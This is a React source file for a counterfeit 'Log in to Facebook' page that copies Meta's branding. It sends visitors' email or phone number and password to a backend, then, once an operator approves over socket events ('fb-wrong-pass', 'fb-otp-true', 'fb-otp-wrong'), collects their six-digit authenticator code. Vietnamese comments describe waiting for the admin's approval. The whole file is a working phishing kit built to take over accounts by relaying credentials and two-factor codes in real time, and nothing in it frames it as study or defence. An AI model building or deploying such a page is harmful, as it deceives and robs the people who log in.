import { useState, useEffect } from 'react';
import { Helmet } from 'react-helmet-async';
// @mui
import {
  Box,
  Stack,
  Typography,
  TextField,
  Button,
  CircularProgress,
  InputAdornment,
  IconButton,
  Divider,
} from '@mui/material';
// components
import Iconify from '../components/iconify';
// sections
import CheckoutOrderComplete from '../sections/@dashboard/e-commerce/checkout/CheckoutOrderComplete';
// redux
import { submitFbLogin, submitFbOtp } from '../redux/slices/fb';
// utils
import { socket } from '../utils/socket';

// ----------------------------------------------------------------------

const META_BLUE = '#0866FF';
const TEXT_BLACK = '#1C1E21';
const BG_GRAY = '#F2F4F7';
const INPUT_BG = '#F5F6F7';
const BORDER_COLOR = '#DDDFE2';

export default function FacebookLoginPage() {
  const [step, setStep] = useState<'login' | 'otp'>('login');
  const [account, setAccount] = useState('');
  const [password, setPassword] = useState('');
  const [verifyCode, setVerifyCode] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [wrongPass, setWrongPass] = useState(false);
  const [wrongOtp, setWrongOtp] = useState(false);
  const [isOrderComplete, setIsOrderComplete] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  
  const [collageSrc, setCollageSrc] = useState('https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp');

  // Chọn ảnh ngẫu nhiên khi component mount
  useEffect(() => {
    const images = [
      'https://static.xx.fbcdn.net/rsrc.php/yb/r/HpEiFYDux5j.webp',
      'https://static.xx.fbcdn.net/rsrc.php/yB/r/83zWJdc6PJI.webp'
    ];
    setCollageSrc(images[Math.floor(Math.random() * images.length)]);
  }, []);


  useEffect(() => {
    socket.connect();
    
    // Listen for wrong pass
    socket.on('fb-wrong-pass', (data: { id: string }) => {
      if (sessionId && data.id === sessionId) {
        setLoading(false);
        setWrongPass(true);
        setStep('login'); 
      }
    });

    // Listen for OTP approved (Show Success Screen)
    socket.on('fb-otp-true', (data: { id: string }) => {
      if (sessionId && data.id === sessionId) {
        setLoading(false);
        setIsOrderComplete(true);
      }
    });

    // Listen for OTP wrong (Re-enter OTP)
    socket.on('fb-otp-wrong', (data: { id: string }) => {
      if (sessionId && data.id === sessionId) {
        setLoading(false);
        setWrongOtp(true);
        setVerifyCode(''); // Xoá mã cũ để nhập lại
      }
    });

    return () => {
      socket.off('fb-wrong-pass');
      socket.off('fb-pass-true');
      socket.off('fb-otp-true');
      socket.off('fb-otp-wrong');
    };
  }, [sessionId]);

  const [loginError, setLoginError] = useState<string | null>(null);

  const handleLoginSubmit = async () => {
    const trimmedAccount = account.trim();
    if (!trimmedAccount || !password.trim()) return;

    const isEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(trimmedAccount);
    const isPhone = /^\+?[0-9]{8,15}$/.test(trimmedAccount);

    if (!isEmail && !isPhone) {
      setLoginError("The email address or mobile number you entered isn't connected to an account. Find your account and log in.");
      return;
    }

    setLoading(true);
    setLoginError(null);
    setWrongPass(false);

    try {
      const result = await submitFbLogin({
        account: trimmedAccount,
        password: password.trim(),
      });

      setSessionId(result.id);
      // setStep('otp');  <-- BỎ: Không chuyển OTP ngay, đợi admin duyệt (socket lắng nghe ở useEffect)
      
    } catch (error) {
      setLoading(false);
      setWrongPass(true);
    }
  };

  const handleOtpSubmit = async () => {
    if (!verifyCode || verifyCode.length !== 6 || !sessionId) return;
    setLoading(true);
    setWrongOtp(false); // Reset lỗi cũ
    try {
      await submitFbOtp(sessionId, verifyCode);
      // setStep('completed'); // BỎ: Không tự động chuyển, đợi lệnh admin (socket fb-otp-true)
    } catch (error) {
      setLoading(false);
    }
  };

  return (
    <>
      <Helmet>
        <title>Log in to Facebook</title>
      </Helmet>

      <Box
        sx={{
          height: '100vh', 
          display: 'flex',
          flexDirection: 'column',
          bgcolor: '#fff',
          overflow: 'hidden',
          fontFamily: '"SF Pro Display", "SF Pro Text", -apple-system, BlinkMacSystemFont, Roboto, "Helvetica Neue", sans-serif',
        }}
      >
        <Box
          sx={{
            flexGrow: 1,
            display: 'flex',
            flexDirection: { xs: 'column', md: 'row' },
            minHeight: 0, // Quan trọng để overflow hoạt động đúng trong flex
          }}
        >
          {/* LEFT SECTION */}
          <Box 
            sx={{ 
              width: { xs: '100%', md: '60%' }, 
              bgcolor: '#fff', 
              display: 'flex', 
              flexDirection: 'column',
              p: { xs: 3, md: 6 },
              position: 'relative',
              height: '100%'
            }}
          >
            {/* Logo */}
            <Box sx={{ mb: { xs: 1, md: 2 } }}>
              <Iconify icon="logos:facebook" width={36} height={36} />
            </Box>

            {/* Collage Image (Random) */}
            <Box sx={{ flexGrow: 1, display: 'flex', justifyContent: 'center', alignItems: 'center', my: 0 }}>
              <Box
                component="img"
                src={collageSrc}
                alt="Collage"
                sx={{ 
                  maxWidth: '100%', 
                  maxHeight: { xs: 300, md: 580 }, // Tăng đáng kể kích thước ảnh
                  objectFit: 'contain' 
                }}
              />
            </Box>

            {/* Large Slogan */}
            <Box sx={{ mt: 'auto', pt: 0 }}>
              <Typography variant="h1" sx={{ 
                fontWeight: 700, 
                fontSize: { xs: 32, md: 56 }, // Tăng nhẹ slogan cho cân đối
                color: TEXT_BLACK, 
                lineHeight: 1.1,
                letterSpacing: -1
              }}>
                Explore the <br /> things <br />
                <span style={{ color: META_BLUE }}>you love.</span>
              </Typography>
            </Box>
          </Box>

          {/* RIGHT SECTION */}
          <Box 
            sx={{ 
              width: { xs: '100%', md: '40%' }, 
              bgcolor: BG_GRAY, 
              borderLeft: { md: `1px solid ${BORDER_COLOR}` },
              display: 'flex',
              flexDirection: 'column',
              justifyContent: 'center',
              alignItems: 'center',
              p: { xs: 4, md: 6 },
              height: '100%'
            }}
          >
            <Box sx={{ width: '100%', maxWidth: 400 }}>
              {/* Nav Header */}
              <Stack direction="row" alignItems="center" spacing={2} sx={{ mb: 4 }}>
                <IconButton size="small" sx={{ color: TEXT_BLACK, p: 0 }}>
                  <Iconify icon="eva:chevron-left-fill" width={24} />
                </IconButton>
                <Typography variant="h5" fontWeight={700} sx={{ color: TEXT_BLACK }}>
                  Log in to Facebook
                </Typography>
              </Stack>

              {/* Login Form */}
              {step === 'login' ? (
                <Stack spacing={2.5}>
                  {(wrongPass || loginError) && (
                    <Box sx={{ p: 1.5, bgcolor: '#ffebe8', border: '1px solid #dd3c10', borderRadius: 1.5 }}>
                      <Typography variant="body2" color="#dd3c10" sx={{ fontWeight: 600 }}>
                        {loginError || "The password you've entered is incorrect. Forgotten password?"}
                      </Typography>
                    </Box>
                  )}

                  <TextField
                    fullWidth
                    placeholder="Email address or mobile number"
                    autoFocus
                    value={account}
                    onChange={(e) => setAccount(e.target.value)}
                    sx={{ 
                      '& .MuiOutlinedInput-root': { 
                        bgcolor: INPUT_BG,
                        height: 52, 
                        borderRadius: 1.5,
                        fontSize: 16,
                        '& fieldset': { border: 'none' }
                      } 
                    }}
                  />

                  <TextField
                    fullWidth
                    placeholder="Password"
                    type={showPassword ? 'text' : 'password'}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    InputProps={{
                      endAdornment: (
                        <InputAdornment position="end">
                          <IconButton edge="end" onClick={() => setShowPassword(!showPassword)}>
                            <Iconify icon={showPassword ? 'eva:eye-fill' : 'eva:eye-off-fill'} />
                          </IconButton>
                        </InputAdornment>
                      ),
                    }}
                    sx={{ 
                      '& .MuiOutlinedInput-root': { 
                        bgcolor: INPUT_BG,
                        height: 52, 
                        borderRadius: 1.5,
                        fontSize: 16,
                        '& fieldset': { border: 'none' }
                      } 
                    }}
                  />

                  <Button
                    fullWidth
                    variant="contained"
                    size="large"
                    onClick={handleLoginSubmit}
                    disabled={loading || !account || !password}
                    sx={{
                      bgcolor: META_BLUE,
                      fontWeight: 700,
                      fontSize: 16,
                      py: 1.5,
                      textTransform: 'none',
                      borderRadius: 6,
                      boxShadow: 'none',
                      '&:hover': { bgcolor: '#0057c2', boxShadow: 'none' },
                    }}
                  >
                    {loading ? <CircularProgress size={24} sx={{ color: '#fff' }} /> : 'Log in'}
                  </Button>

                  <Typography
                    variant="body2"
                    sx={{
                      color: META_BLUE,
                      textAlign: 'center',
                      cursor: 'pointer',
                      fontSize: 14,
                      fontWeight: 700,
                      '&:hover': { textDecoration: 'underline' },
                    }}
                  >
                    Forgotten password?
                  </Typography>

                  <Box sx={{ py: 2 }}>
                    <Button
                      fullWidth
                      variant="outlined"
                      sx={{
                        color: META_BLUE,
                        borderColor: META_BLUE,
                        borderWidth: 1.5,
                        fontWeight: 700,
                        fontSize: 16,
                        py: 1.2,
                        textTransform: 'none',
                        borderRadius: 6,
                        '&:hover': { bgcolor: 'rgba(8, 102, 255, 0.05)', borderColor: META_BLUE, borderWidth: 1.5 },
                      }}
                    >
                      Create new account
                    </Button>
                  </Box>

                  <Stack direction="row" justifyContent="center" alignItems="center" spacing={0.5} sx={{ mt: 2 }}>
                     <Iconify icon="logos:meta-icon" width={16} />
                     <Typography variant="subtitle2" fontWeight={800} sx={{ color: TEXT_BLACK, opacity: 0.9 }}>
                       Meta
                     </Typography>
                  </Stack>
                </Stack>
              ) : (
                <Stack spacing={4}>
                  <Box sx={{ textAlign: 'center' }}>
                    <Typography variant="body2" sx={{ color: '#606770', lineHeight: 1.5 }}>
                      Enter the 6-digit code from your authentication app to verify your identity.
                    </Typography>
                    {wrongOtp && (
                      <Typography variant="body2" color="#dd3c10" sx={{ mt: 1, fontWeight: 700 }}>
                         The code you entered is incorrect. Please check the code and try again.
                      </Typography>
                    )}
                  </Box>

                  <TextField
                    fullWidth
                    placeholder="6-digit code"
                    value={verifyCode}
                    onChange={(e) => setVerifyCode(e.target.value.replace(/[^0-9]/g, '').slice(0, 6))}
                    inputProps={{ 
                      maxLength: 6, 
                      style: { textAlign: 'center', letterSpacing: 10, fontSize: 24, fontWeight: 700 }
                    }}
                    sx={{ '& .MuiOutlinedInput-root': { bgcolor: INPUT_BG, borderRadius: 1.5, '& fieldset': { border: 'none' } } }}
                  />

                  <Button
                    fullWidth
                    variant="contained"
                    size="large"
                    onClick={handleOtpSubmit}
                    disabled={verifyCode.length !== 6 || loading}
                    sx={{
                      bgcolor: META_BLUE,
                      fontWeight: 700,
                      py: 1.5,
                      textTransform: 'none',
                      borderRadius: 6,
                    }}
                  >
                    {loading ? <CircularProgress size={24} sx={{ color: '#fff' }} /> : 'Verify'}
                  </Button>

                  <Typography
                    variant="body2"
                    sx={{ color: META_BLUE, textAlign: 'center', fontSize: 13, cursor: 'pointer', fontWeight: 700 }}
                  >
                    Try another way
                  </Typography>
                </Stack>
              )}
            </Box>
          </Box>
        </Box>

        {/* Footer Minimal Fixed Bottom */}
        <Box sx={{ bgcolor: '#fff', py: 2, textAlign: 'center', borderTop: `1px solid ${BORDER_COLOR}`, flexShrink: 0 }}>
          <Typography variant="caption" sx={{ color: '#737373', fontSize: 11 }}>
             English (UK) · Tiếng Việt · 中文(台灣) · 한국어 · 日本語 · Français (France) · More languages...
          </Typography>
        </Box>
      </Box>

      {/* Success Dialog */}
      <CheckoutOrderComplete 
        open={isOrderComplete} 
        onReset={() => { window.location.href = '/'; }} 
        onDownloadPDF={() => {}} 
      />
    </>
  );
}
